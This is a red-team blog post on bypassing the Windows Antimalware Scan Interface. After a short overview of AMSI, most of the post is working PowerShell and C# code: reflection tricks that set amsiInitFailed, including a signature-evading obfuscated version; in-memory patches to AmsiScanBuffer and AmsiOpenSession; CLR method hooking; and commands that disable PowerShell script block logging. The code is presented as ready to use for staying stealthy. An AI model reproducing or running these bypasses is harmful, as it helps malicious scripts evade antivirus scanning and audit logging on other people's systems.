---
title: "AMSI Bypass"
date: 2023-03-17T15:17:34+03:30
tags: ['security','RedTeam', 'bypass', 'Defense-Evasion']
categories: ['security', 'RedTeam']
---

This post is about different techniques and their review to bypass AMSI.

## AMSI overview

Microsoft's definition of AMSI:

The Windows Antimalware Scan Interface (`AMSI`) is a versatile interface standard that allows your applications and services to `integrate with any antimalware product` that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.

AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for `file` and `memory` or stream scanning, `content source URL/IP` reputation checks, and other techniques.

AMSI also supports the notion of a session so that antimalware vendors can correlate different scan requests. For instance, the different fragments of a malicious payload can be associated to reach a more informed decision, which would be much harder to reach just by looking at those fragments in isolation.

> Generally, `AMSI` provides an interface for security products to scan files, `memory` and other objects of an application. This feature helps prevent `malicious scripts` and `malware` that compromise system security.

## AMSI architecture

When a script or PowerShell is launched, `AMSI.dll` is automatically injected into the processing memory space. Before execution, the following two APIs are used by the antivirus to scan the buffer and strings for signs of malware.

> AmsiScanBuffer()

> AmsiScanString()

![AMSI Dll](/assets/post/AMSI-bypass/amsi-dll.png "AMSI dll")

If there are any indications of malware, the execution will not start and a message will appear that `the script is blocked by the antivirus software`.

![AMSI architecture](/assets/post/AMSI-bypass/amsi7archi.jpg "AMSI architecture")

Some consumers and providers that support AMSI

* Consumers
    * PowerShell (>2.0)
    * JavaScript
    * VBScript
    * VBA (office macro)
    * WMI
    * User Account Control (UAC) elevations
    * Excel 4.0 macros
    * Volume shadow copy operations
    * .NET in-memory assembly loads

* Providers
    * windows defender
    * kaspersky
    * Eset nod32

## Testing AMSI

There are various methods to check that the AMSI is working correctly, the following two methods are reviewed here.

> Testing AMSI with "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386" And "Invoke-Mimikatz"

![Testing AMSI](/assets/post/AMSI-bypass/testing-amsi.png)

## AMSI bypass

There are various methods to bypass AMSI, in the next section some of these methods are explained with examples.

Before looking into the various cases, you should know that published techniques for bypassing AMSI may be detected by antivirus and may not work properly :), But with a series of general changes, this problem can also be solved.

For example, the following technique was used in the past to bypass AMSI, but now antiviruses recognize it as malicious, but this case can be solved with a simple change.

```PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![obfuscation](/assets/post/AMSI-bypass/obfuscation.png)

```PowerShell
[Ref].Assembly.GetType('System.Management.Automation.'+$('Am','siUtils'-join "")).GetField(('am','siInitFailed')-join "",'NonPublic,Static').SetValue($null,$true)
```

You can use [amsi.fail](https://amsi.fail/) to obfuscate your code

### Amsi ScanBuffer Patch

```PowerShell
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```
* Reference
    * [Adam Chester Patch](https://twitter.com/_xpn_/status/1170852932650262530)

There is a problem! And it is the use of `Add-Type`. When Add-Type is used, the code is written to a `temporary file` and then `csc.exe `is used to compile a binary that stays on disk. This creates a problem when you want to remain furtive and don't want to write anything on the disk.

![temporary file](/assets/post/AMSI-bypass/cs-temp.png)

#### Modified Script

```PowerShell
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]

        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    return $TypeBuilder.CreateType()
}

Write-Host "~> AMSI Patch";
Write-Host "~> @xiosec`n";

if([IntPtr]::Size -eq 4){
    $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
    Write-Host "[+] 32-bits process"
}else{
    $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    Write-Host "[+] 64-bits process"
}

try{
    $ScanBufferAddress = Get-ProcAddress $('am','si.dll'-join "") $('Am', 'siScanBuffer'-join"");
    Write-Host "[+] ScanBuffer Address: $ScanBufferAddress";

    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect;
    Write-Host "[+] VirtualProtect Address: $VirtualProtectAddr";
    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate);

    [UInt32]$OldProtect = 0;
    $_ = $VirtualProtect.Invoke($ScanBufferAddress, [uint32]$patch.Length, 0x40, [ref]$OldProtect);

    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [IntPtr]$ScanBufferAddress, [uint32]$patch.Length);
    Write-Host "[*] Patch Sucessfull";

}catch{
    Write-Host "[X] $($Error[0])";
}
```

![amsi patch demo](/assets/post/AMSI-bypass/amsi-patch.gif)

### Forcing an error

There is a function called ‍`amsiInitFailed()`, which returns 0 if detected. This bypass basically assigns amsiInitFailed a Boolean value of True to cause AMSI initialization to fail.

```PowerShell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

### Disable Script Logging

```PowerShell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

```PowerShell
[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
```

### AMSI Bypass Using CLR Hooking

```PowerShell

$code = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
namespace Editor {
    public static class Methods {
        public static void Patch() {
            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
            Methods.Patch(original, replacement);
        }
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int Dummy(string content, string metadata) {
            return 1;
        }
        public static void Patch(MethodInfo original, MethodInfo replacement) {
            //JIT compile methods
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
            //Get pointers to the functions
            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
            //Generate architecture specific shellcode
            byte[] patch = null;
            if (IntPtr.Size == 8) {
                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 2] = address[i];
                }
            } else {
                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 1] = address[i];
                }
            }
            //Temporarily change permissions to RWE
            uint oldprotect;
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
                throw new Win32Exception();
            }
            //Apply the patch
            IntPtr written = IntPtr.Zero;
            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
                throw new Win32Exception();
            }
            //Flush insutruction cache to make sure our new code executes
            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
                throw new Win32Exception();
            }
            //Restore the original memory protection settings
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
                throw new Win32Exception();
            }
        }
        private static string Transform(string input) {
            StringBuilder builder = new StringBuilder(input.Length + 1);
            foreach(char c in input) {
                char m = (char)((int)c - 1);
                builder.Append(m);
            }
            return builder.ToString();
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
    }
}
"@
Add-Type $code
[Editor.Methods]::Patch()
```
* Reference
    * [New AMSI Bypass Using CLR Hooking](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)

### Patching AMSI AmsiOpenSession

```PowerShell
function lookFuncAddr{
    Param($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
    'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
```

* Reference
    * [Tearing AMSI Down With 3 Bytes Only](https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/)

---

## References

* [Antimalware Scan Interface (AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
* [How the AMSI helps you defend against malware](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
* [Detecting Windows AMSI Bypass Techniques](https://www.trendmicro.com/en_us/research/22/l/detecting-windows-amsi-bypass-techniques.html)
* [AMSI Bypass Methods (pentestlaboratories)](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
* AMSI Unchained Review of Known AMSI Bypass Techniques and Introducing a New One (BlackHat Asia 2022)
* [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
* [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
